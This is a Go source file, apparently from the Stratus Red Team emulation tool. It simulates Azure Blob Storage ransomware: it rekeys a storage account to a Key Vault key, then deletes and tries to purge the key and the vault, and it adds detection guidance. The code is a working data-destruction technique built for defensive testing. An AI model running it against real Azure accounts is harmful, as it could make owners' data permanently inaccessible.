package azure

import (
	"context"
	"crypto/rand"
	_ "embed"
	"fmt"
	"log"
	"math/big"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/runtime"
	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/keyvault/armkeyvault"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/storage/armstorage"
	"github.com/Azure/azure-sdk-for-go/sdk/security/keyvault/azkeys"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const KeyName = "ransom-cmk-key"

const CodeBlock = "```"

const numContainers = 5
const numFiles = 51
const minSizeBytes = 1
const maxSizeBytes = 200

var fileExtensions = []string{"sql", "txt", "docx", "pdf", "png", "tar.gz"}
var nameSeparators = []string{" ", "-", "_"}
var wordlist = []string{
	"liable", "donated", "mayday", "blooper", "pueblo", "tantrum", "scary", "secret",
	"secluded", "babied", "ignition", "unfasten", "affirm", "margarine", "credit",
	"underage", "june", "licking", "approve", "overbite", "ditto", "pavilion", "chewy",
	"drivable", "favorable", "kitchen", "wriggly", "shape", "resistant", "unless",
	"backlight", "cruelty", "empower", "freewill", "passage", "net", "retrial", "hulk",
	"drizzly", "ambitious", "banknote", "calm", "these", "outlet", "survivor", "silenced",
	"fantasy", "flogging", "aeration", "balsamic", "antivirus", "glowing", "setup",
	"unpopular", "immobile", "divisive", "dosage", "amicably", "follicle", "ogle",
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.impact.blob-ransomware-service-storage-cmk",
		FriendlyName: "Azure Blob Storage ransomware through Customer-Managed Key Vault key and vault deletion",
		Description: `
Simulates Azure Blob Storage ransomware activity that changes the storage account's server-side encryption to use a Customer-Managed Key (CMK) from a Key Vault that the attacker controls, then deletes the Key Vault to render all data in the storage account inaccessible.

Unlike encryption scope-based ransomware, this technique operates at the storage account level — the attacker does not need to re-upload individual blobs. By rotating the storage account's encryption key to an attacker-controlled Key Vault key and then deleting the vault, all blobs in the account become inaccessible.

Note that due to Azure's purge protection feature (, the Key Vault and key remain soft-deleted and recoverable within the retention period.

You will need to have the <code>Key Vault Administrator</code> role on your Azure subscription to correctly warmup the technique.

Warm-up:

- Create an Azure Storage Account with a system-assigned managed identity
- Create an Azure Key Vault without purge protection
- Grant the storage account the "Key Vault Crypto Service Encryption User" role on the Key Vault
- Create multiple storage containers in the account

Detonation:

- Create a number of blobs in the containers with random content and file extensions
- Enable purge protection on the Key Vault (generates MICROSOFT.KEYVAULT/VAULTS/WRITE activity log event)
- Create an RSA 2048 key in the Key Vault
- Update the storage account encryption settings to use the Customer-Managed Key from Key Vault
- Soft-delete the Key Vault key
- Attempt to purge the key (fails due to purge protection, but generates a log event)
- Soft-delete the Key Vault
- Attempt to purge the Key Vault (fails due to purge protection, but generates a log event)

References:

- https://learn.microsoft.com/en-us/azure/storage/common/customer-managed-keys-overview
- https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/
`,
		Detection: `
You can detect this ransomware activity by monitoring for:

1. Storage account encryption configuration changes (<code>MICROSOFT.STORAGE/STORAGEACCOUNTS/WRITE</code>) where <code>properties.requestbody.properties.encryption.keySource</code> == <code>Microsoft.Keyvault</code>.
2. Key Vault key creation followed by deletion (<code>KeyCreate</code>, <code>KeyDelete</code>).
3. Key Vault deletion (<code>MICROSOFT.KEYVAULT/VAULTS/DELETE</code>) after being linked to a storage account's encryption.

Sample Azure Activity log event for storage account encryption update:

` + CodeBlock + `json
{
  "operationName": "MICROSOFT.STORAGE/STORAGEACCOUNTS/WRITE",
  "category": "Administrative",
  "resultType": "Success",
  "properties": {
    "entity": "/subscriptions/<subscription-id>/resourceGroups/<rg>/providers/Microsoft.Storage/storageAccounts/<storage-account-name>",
	"requestbody": {
		"properties": {
			"encryption": {
				"keySource": "Microsoft.Storage",
				"services": {
					"table": {
						"keyType": "Service"
					},
					"queue": {
						"keyType": "Service"
					}
				}
			},
	}
  }
}
` + CodeBlock + `

Sample Azure Activity log event for Key Vault deletion:

` + CodeBlock + `json
{
  "operationName": "MICROSOFT.KEYVAULT/VAULTS/DELETE",
  "category": "Administrative",
  "resultType": "Success",
  "properties": {
    "entity": "/subscriptions/<subscription-id>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault-name>"
  }
}
` + CodeBlock + `

Sample Key Vault audit event for key deletion:

` + CodeBlock + `json
{
  "operationName": "KeyDelete",
  "category": "AuditEvent",
  "resultType": "Success",
  "properties": {
    "entity": "/subscriptions/<subscription-id>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault-name>/keys/<key-name>"
  }
}
` + CodeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	resourceGroup := params["resource_group_name"]
	keyVaultName := params["key_vault_name"]
	blobServiceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()

	log.Println("Simulating a CMK ransomware attack on storage account " + storageAccount)

	blobClient, err := utils.GetAzureBlobClient(blobServiceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client: %w", err)
	}

	if err := createFakeBlobs(blobClient); err != nil {
		return fmt.Errorf("failed to create fake blobs: %w", err)
	}

	vaultLocation, err := enablePurgeProtection(azureConfig, resourceGroup, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to enable purge protection: %w", err)
	}

	if err := createKeyVaultKey(azureConfig, resourceGroup, keyVaultName); err != nil {
		return fmt.Errorf("failed to create key vault key: %w", err)
	}

	if err := updateStorageAccountEncryption(azureConfig, resourceGroup, storageAccount, keyVaultName); err != nil {
		return fmt.Errorf("failed to update storage account encryption to CMK: %w", err)
	}

	if err := deleteKeyVaultKey(azureConfig, keyVaultName); err != nil {
		return fmt.Errorf("failed to delete key vault key: %w", err)
	}

	if err := attemptPurgeKey(azureConfig, keyVaultName); err != nil {
		return fmt.Errorf("failed to attempt key purge: %w", err)
	}

	if err := deleteKeyVault(azureConfig, resourceGroup, keyVaultName); err != nil {
		return fmt.Errorf("failed to delete key vault: %w", err)
	}

	if err := attemptPurgeKeyVault(azureConfig, keyVaultName, vaultLocation); err != nil {
		return fmt.Errorf("failed to attempt key vault purge: %w", err)
	}

	log.Println("Technique execution completed - storage account encryption key is now wrapped by a deleted Key Vault key")
	return nil
}

func createFakeBlobs(client *azblob.Client) error {
	log.Printf("Creating %d fake blobs across %d containers", numFiles, numContainers)

	for i := 0; i < numFiles; i++ {
		containerName := fmt.Sprintf("container-%d", (i%numContainers)+1)

		word1Idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(wordlist))))
		word2Idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(wordlist))))
		sepIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(nameSeparators))))
		extIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(fileExtensions))))

		blobName := fmt.Sprintf("%s%s%s.%s",
			wordlist[word1Idx.Int64()],
			nameSeparators[sepIdx.Int64()],
			wordlist[word2Idx.Int64()],
			fileExtensions[extIdx.Int64()],
		)

		sizeRange := maxSizeBytes - minSizeBytes
		sizeOffset, _ := rand.Int(rand.Reader, big.NewInt(int64(sizeRange)))
		contentSize := minSizeBytes + int(sizeOffset.Int64())
		content := make([]byte, contentSize)
		rand.Read(content)

		_, err := client.UploadBuffer(context.Background(), containerName, blobName, content, nil)
		if err != nil {
			return fmt.Errorf("failed to upload blob %s to container %s: %w", blobName, containerName, err)
		}
	}

	log.Printf("Created %d fake blobs", numFiles)
	return nil
}

func enablePurgeProtection(azure *providers.AzureProvider, resourceGroup, keyVaultName string) (string, error) {
	vaultsClient, err := getVaultsClient(azure)
	if err != nil {
		return "", fmt.Errorf("failed to create vaults client: %w", err)
	}

	log.Printf("Enabling purge protection on Key Vault: %s", keyVaultName)

	vault, err := vaultsClient.Get(context.Background(), resourceGroup, keyVaultName, nil)
	if err != nil {
		return "", fmt.Errorf("failed to get key vault: %w", err)
	}

	vaultLocation := *vault.Location

	poller, err := vaultsClient.BeginCreateOrUpdate(context.Background(), resourceGroup, keyVaultName, armkeyvault.VaultCreateOrUpdateParameters{
		Location: vault.Location,
		Properties: &armkeyvault.VaultProperties{
			TenantID:                  vault.Properties.TenantID,
			SKU:                       vault.Properties.SKU,
			EnableSoftDelete:          vault.Properties.EnableSoftDelete,
			SoftDeleteRetentionInDays: vault.Properties.SoftDeleteRetentionInDays,
			EnablePurgeProtection:     to.Ptr(true),
			EnableRbacAuthorization:   vault.Properties.EnableRbacAuthorization,
			AccessPolicies:            vault.Properties.AccessPolicies,
		},
	}, nil)
	if err != nil {
		return "", fmt.Errorf("failed to enable purge protection: %w", err)
	}

	_, err = poller.PollUntilDone(context.Background(), &runtime.PollUntilDoneOptions{Frequency: 2 * time.Second})
	if err != nil {
		return "", fmt.Errorf("failed to poll key vault update: %w", err)
	}

	log.Printf("Purge protection enabled on Key Vault: %s", keyVaultName)
	return vaultLocation, nil
}

func createKeyVaultKey(azure *providers.AzureProvider, resourceGroup, keyVaultName string) error {
	keysClient, err := getManagementKeysClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create keys client: %w", err)
	}

	log.Printf("Creating RSA 2048 key in Key Vault: %s", keyVaultName)
	result, err := keysClient.CreateIfNotExist(context.Background(), resourceGroup, keyVaultName, KeyName, armkeyvault.KeyCreateParameters{
		Properties: &armkeyvault.KeyProperties{
			Kty:     to.Ptr(armkeyvault.JSONWebKeyTypeRSA),
			KeySize: to.Ptr(int32(2048)),
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to create key: %w", err)
	}

	log.Printf("Created Key Vault key: %s", *result.Properties.KeyURIWithVersion)
	return nil
}

func updateStorageAccountEncryption(azure *providers.AzureProvider, resourceGroup, storageAccount, keyVaultName string) error {
	accountsClient, err := getStorageAccountsClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create storage accounts client: %w", err)
	}

	keyVaultURI := fmt.Sprintf("https://%s.vault.azure.net", keyVaultName)

	log.Printf("Updating storage account %s encryption to use Customer-Managed Key from Key Vault %s", storageAccount, keyVaultName)
	_, err = accountsClient.Update(context.Background(), resourceGroup, storageAccount, armstorage.AccountUpdateParameters{
		Properties: &armstorage.AccountPropertiesUpdateParameters{
			Encryption: &armstorage.Encryption{
				KeySource: to.Ptr(armstorage.KeySourceMicrosoftKeyvault),
				KeyVaultProperties: &armstorage.KeyVaultProperties{
					KeyName:     to.Ptr(KeyName),
					KeyVaultURI: to.Ptr(keyVaultURI),
				},
			},
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to update storage account encryption: %w", err)
	}

	log.Printf("Storage account encryption updated to use Customer-Managed Key: %s/%s", keyVaultURI, KeyName)
	return nil
}

func deleteKeyVaultKey(azure *providers.AzureProvider, keyVaultName string) error {
	keysClient, err := getDataPlaneKeysClient(azure, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create data plane keys client: %w", err)
	}

	log.Printf("Soft-deleting key: %s from vault: %s", KeyName, keyVaultName)
	_, err = keysClient.DeleteKey(context.Background(), KeyName, nil)
	if err != nil {
		return fmt.Errorf("failed to delete key: %w", err)
	}

	log.Printf("Successfully soft-deleted key: %s", KeyName)
	return nil
}

func attemptPurgeKey(azure *providers.AzureProvider, keyVaultName string) error {
	keysClient, err := getDataPlaneKeysClient(azure, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create data plane keys client: %w", err)
	}

	log.Printf("Attempting to purge deleted key: %s from vault: %s", KeyName, keyVaultName)
	_, err = keysClient.PurgeDeletedKey(context.Background(), KeyName, nil)
	if err != nil {
		log.Printf("Key purge failed as expected (purge protection enabled)")
		return nil
	}

	log.Printf("Successfully purged key: %s. This is unexpected as purge protection should be enabled", KeyName)
	return nil
}

func deleteKeyVault(azure *providers.AzureProvider, resourceGroup, keyVaultName string) error {
	vaultsClient, err := getVaultsClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create vaults client: %w", err)
	}

	log.Printf("Soft-deleting Key Vault: %s", keyVaultName)
	_, err = vaultsClient.Delete(context.Background(), resourceGroup, keyVaultName, nil)
	if err != nil {
		return fmt.Errorf("failed to delete key vault: %w", err)
	}

	log.Printf("Successfully soft-deleted Key Vault: %s", keyVaultName)
	return nil
}

func attemptPurgeKeyVault(azure *providers.AzureProvider, keyVaultName, location string) error {
	vaultsClient, err := getVaultsClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create vaults client: %w", err)
	}

	log.Printf("Attempting to purge deleted Key Vault: %s", keyVaultName)
	_, err = vaultsClient.BeginPurgeDeleted(context.Background(), keyVaultName, location, nil)
	if err != nil {
		log.Printf("Key Vault purge failed as expected (purge protection enabled)")
		return nil
	}

	log.Printf("Successfully initiated purge of Key Vault: %s. This is unexpected as purge protection should be enabled", keyVaultName)
	return nil
}

func getVaultsClient(azure *providers.AzureProvider) (*armkeyvault.VaultsClient, error) {
	return armkeyvault.NewVaultsClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}

func getManagementKeysClient(azure *providers.AzureProvider) (*armkeyvault.KeysClient, error) {
	return armkeyvault.NewKeysClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}

func getDataPlaneKeysClient(azure *providers.AzureProvider, keyVaultName string) (*azkeys.Client, error) {
	vaultURL := fmt.Sprintf("https://%s.vault.azure.net/", keyVaultName)
	return azkeys.NewClient(vaultURL, azure.GetCredentials(), &azkeys.ClientOptions{
		ClientOptions: azure.ClientOptions.ClientOptions,
	})
}

func getStorageAccountsClient(azure *providers.AzureProvider) (*armstorage.AccountsClient, error) {
	return armstorage.NewAccountsClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}
